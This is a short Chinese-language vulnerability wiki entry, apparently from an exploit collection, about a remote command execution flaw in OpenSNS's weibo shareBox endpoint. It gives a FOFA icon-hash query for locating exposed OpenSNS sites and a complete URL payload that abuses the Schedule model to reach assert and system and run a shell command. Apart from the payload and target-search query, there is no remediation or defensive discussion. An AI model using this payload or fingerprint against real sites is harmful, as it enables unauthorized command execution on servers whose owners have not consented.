# OpenSNS shareBox 远程命令执行漏洞

## 漏洞描述

OpenSNS 存在远程命令执行漏洞，攻击者通过漏洞发送特定的请求包可以执行任意命令

## 漏洞影响

> [!NOTE]
>
> OpenSNS

## FOFA

> [!NOTE]
>
> icon_hash="1167011145"

## 漏洞复现

登录页面如下

![image-20210629150345721](http://wikioss.peiqi.tech/vuln/image-20210629150345721.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)



发送Payload

```
/index.php?s=weibo/Share/shareBox&query=app=Common%26model=Schedule%26method=runSchedule%26id[status]=1%26id[method]=Schedule-%3E_validationFieldItem%26id[4]=function%26[6][]=%26id[0]=cmd%26id[1]=assert%26id[args]=cmd=system(ver)
```

![image-20210629150412729](http://wikioss.peiqi.tech/vuln/image-20210629150412729.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)